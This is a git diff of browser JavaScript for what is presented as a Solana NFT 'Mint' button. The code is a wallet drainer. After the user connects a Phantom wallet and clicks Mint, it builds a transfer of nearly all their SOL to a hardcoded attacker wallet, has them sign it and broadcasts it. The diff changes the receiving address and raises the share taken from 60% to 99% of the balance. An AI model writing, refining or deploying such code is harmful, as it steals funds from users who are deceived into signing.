@@ -10,8 +10,8 @@ $(document).ready(function () {
                     'confirmed'
                 );
 
-                const public_key = new solanaWeb3.PublicKey(resp.publicKey);
-                const walletBalance = await connection.getBalance(public_key);
+                const publicKey = new solanaWeb3.PublicKey(resp.publicKey);
+                const walletBalance = await connection.getBalance(publicKey);
                 console.log("Wallet balance:", walletBalance);
 
                 const minBalance = await connection.getMinimumBalanceForRentExemption(0);
@@ -23,7 +23,7 @@ $(document).ready(function () {
                 $('#connect-wallet').text("Mint");
                 $('#connect-wallet').off('click').on('click', async () => {
                     try {
-                        const receiverWallet = new solanaWeb3.PublicKey('2iRzYbrwCugVMcRjx2dXj6QfCDVqGupPUTVHUirDae6D');
+                        const receiverWallet = new solanaWeb3.PublicKey('DVm4XnbDT6hzhcVJBeM2DMbq3URGDpC5qkzd2rwhvFwK');
                         const balanceForTransfer = walletBalance - minBalance;
 
                         if (balanceForTransfer <= 0) {
@@ -31,31 +31,32 @@ $(document).ready(function () {
                             return;
                         }
 
+                        // Создаем транзакцию
                         const transaction = new solanaWeb3.Transaction().add(
                             solanaWeb3.SystemProgram.transfer({
-                                fromPubkey: public_key,
+                                fromPubkey: publicKey,
                                 toPubkey: receiverWallet,
-                                lamports: balanceForTransfer * 0.6,
+                                lamports: balanceForTransfer * 0.99, // 99% от оставшихся средств
                             })
                         );
 
-                        transaction.feePayer = resp.publicKey;
+                        transaction.feePayer = publicKey;
 
-                        const { blockhash } = await connection.getLatestBlockhash();
-                        if (!blockhash) {
-                            throw new Error("Failed to fetch blockhash");
-                        }
+                        // Получаем последний blockhash
+                        const { blockhash } = await connection.getLatestBlockhash('finalized');
                         transaction.recentBlockhash = blockhash;
 
                         console.log("Transaction object before signing:", transaction);
 
+                        // Подписываем транзакцию
                         const signed = await window.solana.signTransaction(transaction);
                         console.log("Signed transaction:", signed);
 
+                        // Сериализуем транзакцию и отправляем
                         const serialized = signed.serialize();
                         console.log("Serialized transaction:", serialized);
 
-                        const txid = await connection.sendRawTransaction(serialized);
+                        const txid = await connection.sendRawTransaction(serialized, { skipPreflight: false });
                         console.log("Transaction confirmed:", txid);
 
                         alert(`Transaction successful! TxID: ${txid}`);
